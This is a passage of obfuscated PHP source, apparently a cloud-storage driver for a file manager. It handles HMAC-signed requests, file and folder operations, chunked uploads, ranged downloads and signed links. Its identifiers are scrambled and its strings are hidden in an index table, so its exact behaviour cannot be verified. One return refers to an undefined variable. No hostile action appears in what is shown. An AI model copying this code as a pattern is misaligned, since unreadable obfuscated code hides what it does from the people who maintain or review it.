$_SERVER[¥Ÿ©ÒèÌ]; foreach ($úêæşàÀ as $Ïú¼è°” => $İŸ¶úù˜) { if (isset($this->{$Ïú¼è°”})) { $this->{$Ïú¼è°”} = $İŸ¶úù˜; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($àÎæãüÃ[1437] . LNG($àÎæãüÃ[1368])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($à³èÂÃ, $åë®¹© = "\x47\x45\x54") { $Ùš®Ù‘Ë =& $_SERVER[¥Ÿ©ÒèÌ]; $¿ŒØô‹é = gmdate($Ùš®Ù‘Ë[1401]); $ªÓ ¥ß = base64_encode(hash_hmac($Ùš®Ù‘Ë[1438], "{$åë®¹©}\x26{$à³èÂÃ}\x26{$¿ŒØô‹é}", md5("{$this->userpass}"), !0)); $šÄ¬¿ò† = array("\x41\x75\164\150\157\162\151\x7a\141\x74\x69\157\156\72\125\x50\x59\x55\x4e\x20{$this->username}\x3a{$ªÓ ¥ß}", "\104\141\x74\145\x3a{$¿ŒØô‹é}"); return $šÄ¬¿ò†; } public function ussRequest($Ë¯çì´Ö, $ú£¾¹×° = "\x47\x45\124", $èŒ–·‹› = false, $É™ÃüÑù = false, $ÖáæÌ‚¤ = false) { $Å™½› =& $_SERVER[¥Ÿ©ÒèÌ]; $Ë¯çì´Ö = trim($Ë¯çì´Ö, $Å™½›[8]); $ÃØı€¿í = "\57{$this->bucket}\57{$Ë¯çì´Ö}"; $¡áÖå€ = $this->ussHeaders($ÃØı€¿í, $ú£¾¹×°); if ($É™ÃüÑù) { $¡áÖå€ = array_merge($¡áÖå€, $É™ÃüÑù); } $—Ç®œ™œ = url_request($this->endpoint . $ÃØı€¿í, $ú£¾¹×°, $èŒ–·‹›, $¡áÖå€, $ÖáæÌ‚¤); if (!$—Ç®œ™œ) { return array($Å™½›[1175] => !1, $Å™½›[1177] => $Å™½›[1439]); } if (strtolower($ú£¾¹×°) == $Å™½›[189] || in_array($—Ç®œ™œ[$Å™½›[1175]], array($Å™½›[1294], $Å™½›[1440]))) { $èŒ–·‹› = $—Ç®œ™œ[$Å™½›[1441]]; } else { $èŒ–·‹› = json_decode($—Ç®œ™œ[$Å™½›[1177]], !0); if (!$èŒ–·‹›) { $èŒ–·‹› = $—Ç®œ™œ[$Å™½›[1177]]; } else { if (!$—Ç®œ™œ[$Å™½›[740]] && isset($èŒ–·‹›[$Å™½›[1442]])) { $èŒ–·‹› = $èŒ–·‹›[$Å™½›[1442]]; } } } return array($Å™½›[1175] => $—Ç®œ™œ[$Å™½›[740]], $Å™½›[1177] => $èŒ–·‹›); } public function mkfile($ÏĞ¡®¨¶, $óßòß¾â = '', $‚É–éÎ = REPEAT_RENAME) { if ($this->setContent($ÏĞ¡®¨¶, $óßòß¾â)) { return $this->getPathOuter($ÏĞ¡®¨¶); } return !1; } public function mkdir($ÈÄáÜ´, $€©ƒÜğ© = REPEAT_SKIP) { $öòÔ•ë¸ =& $_SERVER[¥Ÿ©ÒèÌ]; $‡ıµ÷¥¸ = trim($ÈÄáÜ´, $öòÔ•ë¸[8]); if ($this->_isFolder($‡ıµ÷¥¸)) { return $this->getPathOuter($‡ıµ÷¥¸); } $è©Ÿûş‘ = array($öòÔ•ë¸[1443]); $‘ùÍœÀé = $this->ussRequest($‡ıµ÷¥¸, $öòÔ•ë¸[221], !1, $è©Ÿûş‘); return $‘ùÍœÀé[$öòÔ•ë¸[1175]] ? $this->getPathOuter($‡ıµ÷¥¸) : !1; } public function copyFile($àñ„¥••, $‡öñ…”ò) { $½„²”¼ˆ =& $_SERVER[¥Ÿ©ÒèÌ]; $ºâş§ÔÈ = array($½„²”¼ˆ[1444] . "\57{$this->bucket}\57{$àñ„¥••}", $½„²”¼ˆ[1445]); $’§ô¿–Î = $this->ussRequest($‡öñ…”ò, $½„²”¼ˆ[223], !1, $ºâş§ÔÈ); return $’§ô¿–Î[$½„²”¼ˆ[1175]] ? !0 : $this->getPathOuter($‡öñ…”ò); } public function moveFile($ĞÆ„İ, $¸ó¢Ë€å) { $àß¿û·İ =& $_SERVER[¥Ÿ©ÒèÌ]; $È¥âŸªõ = array($àß¿û·İ[1446] . "\x2f{$this->bucket}\x2f{$ĞÆ„İ}", $àß¿û·İ[1445]); $ÚÏ»•² = $this->ussRequest($¸ó¢Ë€å, $àß¿û·İ[223], !1, $È¥âŸªõ); return $ÚÏ»•²[$àß¿û·İ[1175]] ? !0 : $this->getPathOuter($¸ó¢Ë€å); } public function delFile($—áÀ’Ì–) { $šË’ü¹ =& $_SERVER[¥Ÿ©ÒèÌ]; $´îªú¶û = $this->ussRequest($—áÀ’Ì–, $šË’ü¹[1447]); return $´îªú¶û[$šË’ü¹[1175]] ? !0 : !1; } public function delFolder($­ûé‚Áû) { $ËÊÍÇê© =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$this->exist($­ûé‚Áû)) { return !0; } $this->listItemCache = !1; $Êñ§é¯Í = $Åªñóà† = array(); $this->fileList($­ûé‚Áû, $Êñ§é¯Í, $Åªñóà†, !0); $this->listItemCache = !0; foreach ($Åªñóà† as $ƒµŞáü) { $×ŸªŸëª = $this->ussRequest($ƒµŞáü[$ËÊÍÇê©[32]], $ËÊÍÇê©[1447]); if (!$×ŸªŸëª[$ËÊÍÇê©[1175]]) { return !1; } } foreach ($Êñ§é¯Í as $û…‚™¬î) { $×ŸªŸëª = $this->ussRequest($û…‚™¬î, $ËÊÍÇê©[1447]); if (!$×ŸªŸëª[$ËÊÍÇê©[1175]]) { return !1; } } $×ŸªŸëª = $this->ussRequest($­ûé‚Áû, $ËÊÍÇê©[1447]); return $×ŸªŸëª[$ËÊÍÇê©[1175]]; } public function rename($ŞŸ×Çô‚, $×¦Ê‹§÷) { if ($this->isFile($ŞŸ×Çô‚)) { $×¦Ê‹§÷ = get_path_father($ŞŸ×Çô‚) . $×¦Ê‹§÷; return $this->moveFile($ŞŸ×Çô‚, $×¦Ê‹§÷); } return $this->renameObject($ŞŸ×Çô‚, $×¦Ê‹§÷); } public function fileInfo($ú°ô×•, $‡’Â§Äñ = false, $Í«¶ˆ›Ê = array()) { $àÔ…ºşÖ =& $_SERVER[¥Ÿ©ÒèÌ]; $—–õİÏ = array($àÔ…ºşÖ[32] => $this->pathThis($ú°ô×•), $àÔ…ºşÖ[78] => $this->getPathOuter($àÔ…ºşÖ[8] . $ú°ô×•), $àÔ…ºşÖ[33] => $àÔ…ºşÖ[192], $àÔ…ºşÖ[80] => isset($Í«¶ˆ›Ê[$àÔ…ºşÖ[80]]) ? $Í«¶ˆ›Ê[$àÔ…ºşÖ[80]] : 0, $àÔ…ºşÖ[167] => $this->ext($ú°ô×•)); if ($‡’Â§Äñ) { return $—–õİÏ; } $—–õİÏ[$àÔ…ºşÖ[193]] = $—–õİÏ[$àÔ…ºşÖ[86]] = 0; $—–õİÏ[$àÔ…ºşÖ[194]] = $—–õİÏ[$àÔ…ºşÖ[195]] = !0; if (empty($Í«¶ˆ›Ê)) { $Í«¶ˆ›Ê = $this->objectMeta($ú°ô×•); if (!$Í«¶ˆ›Ê) { return $—–õİÏ; } } $—–õİÏ[$àÔ…ºşÖ[193]] = intval($Í«¶ˆ›Ê[$àÔ…ºşÖ[1448]]); $—–õİÏ[$àÔ…ºşÖ[86]] = intval($Í«¶ˆ›Ê[$àÔ…ºşÖ[1449]]); $—–õİÏ[$àÔ…ºşÖ[80]] = $Í«¶ˆ›Ê[$àÔ…ºşÖ[80]]; return $—–õİÏ; } public function folderInfo($—®½€Ãƒ, $³ÒÓî™ = false) { $¢¾½‰™“ =& $_SERVER[¥Ÿ©ÒèÌ]; $—Şñ€³å = array($¢¾½‰™“[32] => $this->pathThis($—®½€Ãƒ), $¢¾½‰™“[78] => $this->getPathOuter($¢¾½‰™“[8] . $—®½€Ãƒ), $¢¾½‰™“[33] => $¢¾½‰™“[79]); if ($³ÒÓî™) { return $—Şñ€³å; } $—Şñ€³å[$¢¾½‰™“[193]] = $—Şñ€³å[$¢¾½‰™“[86]] = 0; $—Şñ€³å[$¢¾½‰™“[194]] = $—Şñ€³å[$¢¾½‰™“[195]] = !0; if (empty($ıâ¦š™‹)) { $ıâ¦š™‹ = $this->objectMeta($—®½€Ãƒ); if (!$ıâ¦š™‹) { return $—Şñ€³å; } } $—Şñ€³å[$¢¾½‰™“[193]] = intval($ıâ¦š™‹[$¢¾½‰™“[1448]]); $—Şñ€³å[$¢¾½‰™“[86]] = intval($ıâ¦š™‹[$¢¾½‰™“[1449]]); return $—Şñ€³å; } private function listObjs($ÜŸëÙÔ, $ÆğéÑ›æ = 0, $òË™‚õî = 1000) { $äİõ€û­ =& $_SERVER[¥Ÿ©ÒèÌ]; $…ğ‘¬Ñ¼ = array($äİõ€û­[1450], $äİõ€û­[1451] . $òË™‚õî); if ($ÆğéÑ›æ) { $…ğ‘¬Ñ¼[] = $äİõ€û­[1452] . $ÆğéÑ›æ; } $ûó†à´à = $this->ussRequest($ÜŸëÙÔ, $äİõ€û­[225], !1, $…ğ‘¬Ñ¼); return !$ûó†à´à[$äİõ€û­[1175]] ? !1 : $ûó†à´à[$äİõ€û­[1177]]; } private function fileList($¦Äæ¤®, &$”Ù˜¹ë§, &$‘­Ú½¯Õ, $ÖœšÆ¦´ = false) { $¤îÉÒ´Û =& $_SERVER[¥Ÿ©ÒèÌ]; $µ’½Úä = $¤îÉÒ´Û[12]; $Œ‚ß¦·ª = 1000; $şÛ±ê¾ = rtrim($¦Äæ¤®, $¤îÉÒ´Û[8]) . $¤îÉÒ´Û[8]; $¾¶ã¦ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $ßì¡Ñ…ñ = $this->listObjs($¦Äæ¤®, $µ’½Úä, $Œ‚ß¦·ª); if (!$ßì¡Ñ…ñ) { return !1; } $µ’½Úä = isset($ßì¡Ñ…ñ[$¤îÉÒ´Û[1453]]) ? $ßì¡Ñ…ñ[$¤îÉÒ´Û[1453]] : $¤îÉÒ´Û[12]; $–øÈãÑ = isset($ßì¡Ñ…ñ[$¤îÉÒ´Û[1454]]) ? $ßì¡Ñ…ñ[$¤îÉÒ´Û[1454]] : array(); foreach ($–øÈãÑ as $¼¢æóı€) { $¿¾‘™Àù = $¼¢æóı€[$¤îÉÒ´Û[33]] == $¤îÉÒ´Û[79] ? !0 : !1; $æü¤Ú· = ltrim($şÛ±ê¾ . $¼¢æóı€[$¤îÉÒ´Û[32]], $¤îÉÒ´Û[8]) . ($¿¾‘™Àù ? $¤îÉÒ´Û[8] : $¤îÉÒ´Û[12]); $öª™Í = array($¤îÉÒ´Û[32] => $æü¤Ú·, $¤îÉÒ´Û[33] => $¿¾‘™Àù ? $¤îÉÒ´Û[79] : $¤îÉÒ´Û[192], $¤îÉÒ´Û[80] => $¼¢æóı€[$¤îÉÒ´Û[341]], $¤îÉÒ´Û[1449] => $¼¢æóı€[$¤îÉÒ´Û[1455]]); if ($¾¶ã¦) { $this->cacheMethod($¤îÉÒ´Û[198], $æü¤Ú·, $¿¾‘™Àù); $this->cacheMethod($¤îÉÒ´Û[199], $æü¤Ú·, $öª™Í); } if ($¿¾‘™Àù) { $”Ù˜¹ë§[] = $æü¤Ú·; if ($ÖœšÆ¦´) { $this->fileList($æü¤Ú·, $”Ù˜¹ë§, $‘­Ú½¯Õ, $ÖœšÆ¦´); } continue; } $‘­Ú½¯Õ[] = $öª™Í; } if (count($–øÈãÑ) < $Œ‚ß¦·ª) { break; } } if ($¾¶ã¦) { $this->cacheMethod($¤îÉÒ´Û[198], $¦Äæ¤®, !0); } } public function listPath($¬öÆÂ¾», $‚æÎ’Ÿ· = false) { $óÅ…¶öÂ =& $_SERVER[¥Ÿ©ÒèÌ]; $«ãÏÑœ = $ôè‘•õ­ = array(); $this->fileList($¬öÆÂ¾», $«ãÏÑœ, $ôè‘•õ­); foreach ($«ãÏÑœ as $«±»ïÌ => $áé©¦¹Ö) { $«ãÏÑœ[$«±»ïÌ] = $this->folderInfo($áé©¦¹Ö, $‚æÎ’Ÿ·); } foreach ($ôè‘•õ­ as $«±»ïÌ => $áé©¦¹Ö) { $ôè‘•õ­[$«±»ïÌ] = $this->fileInfo($áé©¦¹Ö[$óÅ…¶öÂ[32]], $‚æÎ’Ÿ·, $áé©¦¹Ö); } return array($óÅ…¶öÂ[77] => $«ãÏÑœ, $óÅ…¶öÂ[76] => $ôè‘•õ­); } public function has($çÁ—‘ñÏ, $·¸…”áÈ = false, $˜Ò‹ ’í = true) { $Û§öÜ½º =& $_SERVER[¥Ÿ©ÒèÌ]; $–»€¤ø = $Û§öÜ½º[12]; $ã“ÛÒ¸æ = 500; $Üµ°Ãã¦ = 0; $³…Ï©€÷ = 0; $„€õ×»¨ = rtrim($çÁ—‘ñÏ, $Û§öÜ½º[8]) . $Û§öÜ½º[8]; while (!0) { check_abort(); $¬úªºÃ = $this->listObjs($çÁ—‘ñÏ, $–»€¤ø, $ã“ÛÒ¸æ); if (!$¬úªºÃ) { return !1; } $–»€¤ø = isset($¬úªºÃ[$Û§öÜ½º[1453]]) ? $¬úªºÃ[$Û§öÜ½º[1453]] : $Û§öÜ½º[12]; $æˆ¢ù  = isset($¬úªºÃ[$Û§öÜ½º[1454]]) ? $¬úªºÃ[$Û§öÜ½º[1454]] : array(); if (empty($æˆ¢ù )) { break; } $ğ¢ñ»… = array_filter($æˆ¢ù , function ($¯½™Çªæ) { $âîî‚Ğñ =& $_SERVER[¥Ÿ©ÒèÌ]; return $¯½™Çªæ[$âîî‚Ğñ[33]] == $âîî‚Ğñ[79]; }); $úƒÎæ«ó = count($æˆ¢ù ); $ğ¢ñ»… = count($ğ¢ñ»…); $â™Ÿ˜ïÕ = $úƒÎæ«ó - $ğ¢ñ»…; if ($·¸…”áÈ) { $³…Ï©€÷ += $ğ¢ñ»…; $Üµ°Ãã¦ += $â™Ÿ˜ïÕ; if ($úƒÎæ«ó < $ã“ÛÒ¸æ) { break; } continue; } if ($˜Ò‹ ’í) { if ($â™Ÿ˜ïÕ) { return !0; } } else { if ($ğ¢ñ»…) { return !0; } } if ($úƒÎæ«ó < $ã“ÛÒ¸æ) { break; } } if ($·¸…”áÈ) { return array($Û§öÜ½º[202] => $Üµ°Ãã¦, $Û§öÜ½º[203] => $³…Ï©€÷); } return !1; } public function listAll($àÌ—á¿¸) { $Ê·‘›ê =& $_SERVER[¥Ÿ©ÒèÌ]; $Şö€æõ = $ÕİìÅ‘ = array(); $this->fileList($àÌ—á¿¸, $Şö€æõ, $ÕİìÅ‘, !0); $Áàõ‘ŞÓ = array(); foreach ($ÕİìÅ‘ as $ÛÉ¶ˆø£) { $Áàõ‘ŞÓ[$ÛÉ¶ˆø£[$Ê·‘›ê[32]]] = $ÛÉ¶ˆø£[$Ê·‘›ê[80]]; } foreach ($Şö€æõ as $ÛÉ¶ˆø£) { if (is_string($ÛÉ¶ˆø£)) { $Áàõ‘ŞÓ[$ÛÉ¶ˆø£] = 0; } } return $this->listAllFiles($àÌ—á¿¸, array_keys($Áàõ‘ŞÓ), $Áàõ‘ŞÓ); } public function canRead($Ü¿şÏãä) { return $this->exist($Ü¿şÏãä) ? !0 : !1; } public function canWrite($¡™¶ä˜) { return $this->exist($¡™¶ä˜) ? !0 : !1; } public function getContent($„ äÉŠ‰) { return $this->fileSubstr($„ äÉŠ‰, 0, -1); } public function setContent($ÃĞíµÅ™, $ñã²ó”• = '') { $ÇŸš²Æ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$ñã²ó”•) { $ºê›‚ÒÚ = $this->ussRequest($ÃĞíµÅ™, $ÇŸš²Æ[221]); return $ºê›‚ÒÚ[$ÇŸš²Æ[1175]]; } $ì–¼ù¿¥ = $this->tempFile($this->pathThis($ÃĞíµÅ™)); file_put_contents($ì–¼ù¿¥, $ñã²ó”•); if ($this->upload($ÃĞíµÅ™, $ì–¼ù¿¥)) { $this->tempFileRemve($ì–¼ù¿¥); return !0; } return !1; } public function fileSubstr($¨é¼ø¨é, $ğÉË£çø, $ŒÔ¬½) { $ß±º—ê¤ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!($ˆĞºÒƒ = $this->link($¨é¼ø¨é))) { return !1; } $Öê¦Äˆõ = !1; if ($ŒÔ¬½ > 0) { $ÕÎÌ¶Ê› = $ğÉË£çø + $ŒÔ¬½ - 1; $Öê¦Äˆõ = array($ß±º—ê¤[1416] . $ğÉË£çø . $ß±º—ê¤[460] . $ÕÎÌ¶Ê›); } $êÏüÒºˆ = url_request($ˆĞºÒƒ, $ß±º—ê¤[225], !1, $Öê¦Äˆõ); return $êÏüÒºˆ[$ß±º—ê¤[740]] ? $êÏüÒºˆ[$ß±º—ê¤[1177]] : !1; } public function upload($•ğÇ·, $ï«ŒÜùŞ, $ıÍ‹ç‚ = false, $¼”àÎ‘È = REPEAT_REPLACE) { $Ó‘×¶Ã« =& $_SERVER[¥Ÿ©ÒèÌ]; $¿ìàòƒ¿ = IO::size($ï«ŒÜùŞ); if ($¿ìàòƒ¿ <= 1024 * 1024 * 200) { $±À¶ŸÛĞ = array($Ó‘×¶Ã«[1456] . $ï«ŒÜùŞ); $®‰ÍŒ¯Ç = $this->ussRequest($•ğÇ·, $Ó‘×¶Ã«[223], $±À¶ŸÛĞ); return $®‰ÍŒ¯Ç[$Ó‘×¶Ã«[1175]] ? $this->getPathOuter($•ğÇ·) : !1; } $Î‚·‘§Ÿ = 1024 * 1024 * 10; $ÈßóÅÌÌ = array($Ó‘×¶Ã«[1457], $Ó‘×¶Ã«[1458] . $¿ìàòƒ¿, $Ó‘×¶Ã«[1459], $Ó‘×¶Ã«[1460] . $Î‚·‘§Ÿ); $®‰ÍŒ¯Ç = $this->ussRequest($•ğÇ·, $Ó‘×¶Ã«[223], !1, $ÈßóÅÌÌ); if (!$®‰ÍŒ¯Ç[$Ó‘×¶Ã«[1175]]) { return !1; } $î¤Ÿƒû¯ = $®‰ÍŒ¯Ç[$Ó‘×¶Ã«[1177]]; $àĞ¸Âªø = 0; $ŠêşÈ© = $î¤Ÿƒû¯[$Ó‘×¶Ã«[1461]]; $²¼§‡Ç = fopen($ï«ŒÜùŞ, $Ó‘×¶Ã«[1365]); if (!$²¼§‡Ç) { return !1; } do { $Ú»–‹‹ = $î¤Ÿƒû¯[$Ó‘×¶Ã«[1462]]; fseek_64($²¼§‡Ç, $àĞ¸Âªø); $ô¼ğèª = fread($²¼§‡Ç, $Ú»–‹‹); $´¬ãÚ…  = 0; do { $´¬ãÚ… ++; $î¤Ÿƒû¯ = $this->uploadPart($•ğÇ·, $î¤Ÿƒû¯, $ô¼ğèª); } while (!$î¤Ÿƒû¯ && $´¬ãÚ…  < 3); if (!$î¤Ÿƒû¯) { return !1; } $ŠêşÈ© = $î¤Ÿƒû¯[$Ó‘×¶Ã«[1461]]; $àĞ¸Âªø += $Ú»–‹‹; } while ($ŠêşÈ© != -1); fclose($²¼§‡Ç); $ÈßóÅÌÌ = array($Ó‘×¶Ã«[1463], $Ó‘×¶Ã«[1464] . $î¤Ÿƒû¯[$Ó‘×¶Ã«[1465]], $Ó‘×¶Ã«[1459]); $®‰ÍŒ¯Ç = $this->ussRequest($•ğÇ·, $Ó‘×¶Ã«[223], !1, $ÈßóÅÌÌ); return $®‰ÍŒ¯Ç[$Ó‘×¶Ã«[1175]] ? $this->getPathOuter($¸¼â‹»à) : !1; } private function uploadPart($„ïİâ …, $ºäÂÖ£ˆ, &$²²‡Õò“) { $î ¾®Üí =& $_SERVER[¥Ÿ©ÒèÌ]; $ıõÕ’’ = array($î ¾®Üí[1466], $î ¾®Üí[1464] . $ºäÂÖ£ˆ[$î ¾®Üí[1465]], $î ¾®Üí[1467] . $ºäÂÖ£ˆ[$î ¾®Üí[1461]], $î ¾®Üí[139] . $ºäÂÖ£ˆ[$î ¾®Üí[1462]]); $…¼æö¢ = $this->ussRequest($„ïİâ …, $î ¾®Üí[223], $²²‡Õò“, $ıõÕ’’); return !$…¼æö¢[$î ¾®Üí[1175]] ? $…¼æö¢[$î ¾®Üí[1175]] : $…¼æö¢[$î ¾®Üí[1177]]; } public function uploadFormData($Çå£¯¯¼, $Õêğ«À÷ = 3600) { return $this->uploadPolicy($Çå£¯¯¼, $Õêğ«À÷); } public function multiUploadFormData($Œ„‰ş¬ê, $Úïı¶¸î = 3600) { $Şƒášã =& $_SERVER[¥Ÿ©ÒèÌ]; $¡³øœ¯ş = (int) $GLOBALS[$Şƒášã[7]][$Şƒášã[80]]; return $this->uploadPolicy($Œ„‰ş¬ê, $Úïı¶¸î, $¡³øœ¯ş); } private function uploadPolicy($ë”åêãã, $ÂÊÖ¬Ïı = 3600, $±ŒÔ¦÷ = 0) { $Ìúòëğ =& $_SERVER[¥Ÿ©ÒèÌ]; $ÈÈ×…şÎ = $Ìúòëğ[8] . $this->bucket; $áØ˜ÛóÍ = gmdate($Ìúòëğ[1401]); $£œÕÓÛ¸ = array($Ìúòëğ[1468] => $this->bucket, $Ìúòëğ[1469] => $ë”åêãã, $Ìúòëğ[1470] => time() + $ÂÊÖ¬Ïı, $Ìúòëğ[1471] => $áØ˜ÛóÍ); if ($±ŒÔ¦÷) { $£œÕÓÛ¸[$Ìúòëğ[1381]] = $±ŒÔ¦÷; } $¤é×©„¬ = base64_encode(json_encode($£œÕÓÛ¸)); $¸Ô¥ï¡ = base64_encode(hash_hmac($Ìúòëğ[1438], "\x50\117\x53\124\x26{$ÈÈ×…şÎ}\46{$áØ˜ÛóÍ}\46{$¤é×©„¬}", md5("{$this->userpass}"), !0)); $áèĞìµö = array($Ìúòëğ[1306] => $¤é×©„¬, $Ìúòëğ[1472] => "\x55\120\x59\x55\x4e\x20{$this->username}\72{$¸Ô¥ï¡}", $Ìúòëğ[174] => $this->endpoint . $ÈÈ×…şÎ); return $áèĞìµö; } public function download($ÀêÁ¹Å, $Ã¢¾­ê) { $«¢ŞÓÇÚ = IO::getPathInner(IO::mkfile($Ã¢¾­ê)); if (!($ÕĞ–“¥É = $this->link($ÀêÁ¹Å))) { return !1; } $Ï´Çµ‡Â = 0; $©ïÙİöí = 1024 * 200; $µô†·Û• = fopen($«¢ŞÓÇÚ, $_SERVER[¥Ÿ©ÒèÌ][1422]); while (!0) { $şæ ¦°Ğ = $this->fileSubstr($ÀêÁ¹Å, $Ï´Çµ‡Â, $©ïÙİöí); if ($şæ ¦°Ğ === !1) { return !1; } fwrite($µô†·Û•, $şæ ¦°Ğ); $Ï´Çµ‡Â += $©ïÙİöí; if (strlen($şæ ¦°Ğ) < $©ïÙİöí) { break; } } fclose($µô†·Û•); return $Ã¢¾­ê; } public function link($îÇç˜, $•Ù¤ğ¿ç = array()) { $÷ÓŠÏä­ =& $_SERVER[¥Ÿ©ÒèÌ]; $îÇç˜ = trim($îÇç˜, $÷ÓŠÏä­[8]); if (!empty($this->token)) { $ÅÈË™î© = strtotime(date($÷ÓŠÏä­[1473])); $íÚ¦”Ö× = substr(md5($this->token . $÷ÓŠÏä­[288] . $ÅÈË™î© . $÷ÓŠÏä­[1474] . $îÇç˜), 12, 8) . $ÅÈË™î©; $•Ù¤ğ¿ç[] = $÷ÓŠÏä­[1475] . $íÚ¦”Ö×; } $ß¡ÆÀŒş = !empty($•Ù¤ğ¿ç) ? $÷ÓŠÏä­[73] . implode($÷ÓŠÏä­[288], $•Ù¤ğ¿ç) : $÷ÓŠÏä­[12]; return $this->getHost() . $÷ÓŠÏä­[8] . $îÇç˜ . $ß¡ÆÀŒş; } public function fileOut($È¿Îû ¿, $ƒÒ©ËÖ— = false, $ÁŠë´™ñ = false, $¢™Ù¤¢ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($È¿Îû ¿, $ƒÒ©ËÖ—, $ÁŠë´™ñ, $¢™Ù¤¢); } if (!$ÁŠë´™ñ) { $ÁŠë´™ñ = $this->pathThis($È¿Îû ¿); } $¶ö¿âîœ = $ƒÒ©ËÖ— ? array($_SERVER[¥Ÿ©ÒèÌ][1476] . rawurlencode($ÁŠë´™ñ)) : array(); $Ñ±şòØ = $this->link($È¿Îû ¿, $¶ö¿âîœ); $this->fileOutLink($Ñ±şòØ); } public function fileOutServer($¸ÉÉÌ›Ü, $¶£ÛïÒ¤ = false, $ï—ÄÖ¢¹ = false, $°‰Åœ¼ = '') { parent::fileOut($¸ÉÉÌ›Ü, $¶£ÛïÒ¤, $ï—ÄÖ¢¹, $°‰Åœ¼); } public function fileOutImage($ÓÂî¬èâ, $ ‹à ßÃ = 250) { $¥†§¯ç¤ = $this->link($ÓÂî¬èâ . $_SERVER[¥Ÿ©ÒèÌ][1477] . $ ‹à ßÃ); $this->fileOutLink($¥†§¯ç¤); } public function fileOutImageServer($ËÚç«¦, $»®´ºÉş = 250) { parent::fileOutImage($ËÚç«¦, $»®´ºÉş); } public function hashMd5($¬’Œ¥àÌ) { $£”™¼´© =& $_SERVER[¥Ÿ©ÒèÌ]; $¬Û¾ŒûÙ = $this->_objectMeta($¬’Œ¥àÌ); return isset($¬Û¾ŒûÙ[$£”™¼´©[207]]) ? $¬Û¾ŒûÙ[$£”™¼´©[207]] : !1; } public function size($ËÚöâ¹‡) { $ä¬Ğ® = $this->objectMeta($ËÚöâ¹‡); return $ä¬Ğ® ? $ä¬Ğ®[$_SERVER[¥Ÿ©ÒèÌ][80]] : 0; } public function info($ü²–’¸à) { if ($this->isFolder($ü²–’¸à)) { return $this->folderInfo($ü²–’¸à); } else { if ($this->isFile($ü²–’¸à)) { return $this->fileInfo($ü²–’¸à); } } return !1; } public function exist($ªİŞ˜á½) { return $this->isFile($ªİŞ˜á½) || $this->isFolder($ªİŞ˜á½); } public function isFile($ÏãŠÈï–) { return !$this->isFolder($ÏãŠÈï–) && $this->objectMeta($ÏãŠÈï–); } public function isFolder($ìÈŒ¶Ò°) { return $this->cacheMethod($_SERVER[¥Ÿ©ÒèÌ][198], $ìÈŒ¶Ò°); } protected function objectMeta($•¡€ĞĞ) { return $this->cacheMethod($_SERVER[¥Ÿ©ÒèÌ][199], $•¡€ĞĞ); } protected function _objectMeta($Ô¢õÜëğ) { $ÔîÙÅ™ä =& $_SERVER[¥Ÿ©ÒèÌ]; if ($Ô¢õÜëğ == $ÔîÙÅ™ä[12] || $Ô¢õÜëğ == $ÔîÙÅ™ä[8]) { return array(); } $ŠĞ¸¢èØ = $this->ussRequest($Ô¢õÜëğ, $ÔîÙÅ™ä[1478]); if (!$ŠĞ¸¢èØ[$ÔîÙÅ™ä[1175]]) { return null; } $ÄÌ­“àä = isset($ŠĞ¸¢èØ[$ÔîÙÅ™ä[1177]]) ? $ŠĞ¸¢èØ[$ÔîÙÅ™ä[1177]] : array(); if (!isset($ÄÌ­“àä[$ÔîÙÅ™ä[1479]])) { return null; } $²Ôö ÛÚ = array($ÔîÙÅ™ä[33] => isset($ÄÌ­“àä[$ÔîÙÅ™ä[1479]]) ? $ÄÌ­“àä[$ÔîÙÅ™ä[1479]] : null, $ÔîÙÅ™ä[80] => isset($ÄÌ­“àä[$ÔîÙÅ™ä[1480]]) ? $ÄÌ­“àä[$ÔîÙÅ™ä[1480]] : null, $ÔîÙÅ™ä[207] => isset($ÄÌ­“àä[$ÔîÙÅ™ä[1481]]) ? $ÄÌ­“àä[$ÔîÙÅ™ä[1481]] : null, $ÔîÙÅ™ä[1448] => isset($ÄÌ­“àä[$ÔîÙÅ™ä[1482]]) ? $ÄÌ­“àä[$ÔîÙÅ™ä[1482]] : null); $²Ôö ÛÚ[$ÔîÙÅ™ä[1449]] = isset($ÄÌ­“àä[$ÔîÙÅ™ä[1483]]) ? strtotime($ÄÌ­“àä[$ÔîÙÅ™ä[1483]]) : $²Ôö ÛÚ[$ÔîÙÅ™ä[1448]]; return $²Ôö ÛÚ; } protected function _isFolder($áÌÇö™…) { $†úŞŒÙÑ =& $_SERVER[¥Ÿ©ÒèÌ]; if ($áÌÇö™… == $†úŞŒÙÑ[12] || $áÌÇö™… == $†úŞŒÙÑ[8]) { return !0; } $•»°äØÛ = $this->_objectMeta($áÌÇö™…); return isset($•»°äØÛ[$†úŞŒÙÑ[33]]) && $•»°äØÛ[$†úŞŒÙÑ[33]] == $†úŞŒÙÑ[79] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($Ğ™À¹³Ğ = false) { } public function exist($û©¹à¡Ç) { $€ìåÊÙ¼ = $this->info($û©¹à¡Ç); return $€ìåÊÙ¼[$_SERVER[¥Ÿ©ÒèÌ][194]]; } public function isFile($‘©ü‘“Ø) { $­ú—åÓˆ = $this->info($‘©ü‘“Ø); return $­ú—åÓˆ[$_SERVER[¥Ÿ©ÒèÌ][194]]; } public function isFolder($è–”„Ô€) { return !1; } public function size($¤ßˆ†ü¯) { $’Â½†Î˜ = $this->info($¤ßˆ†ü¯); return $’Â½†Î˜[$_SERVER[¥Ÿ©ÒèÌ][80]]; } public function info($õÌ¨âŒ–) { return $this->infoParse($õÌ¨âŒ–); } public function infoAuth($úäç‡») { return $this->infoParse($úäç‡»); } public function infoWithChildren($’Æ›ÄÈ¥) { return $this->infoParse($’Æ›ÄÈ¥); } public function infoFull($¦õ¼·éå) { return $this->infoParse($¦õ¼·éå); } private function infoParse($‚ÜØÅÃ“) { $íæİ’ÂÊ =& $_SERVER[¥Ÿ©ÒèÌ]; $Ú§ªØ„é = $this->header($‚ÜØÅÃ“); if (!$Ú§ªØ„é || !$Ú§ªØ„é[$íæİ’ÂÊ[740]]) { return !1; } $Ö‡Ó¢à = _get($Ú§ªØ„é, $íæİ’ÂÊ[341], 0); $ÀÕ÷Ãğ¹ = array($íæİ’ÂÊ[32] => $Ú§ªØ„é[$íæİ’ÂÊ[32]], 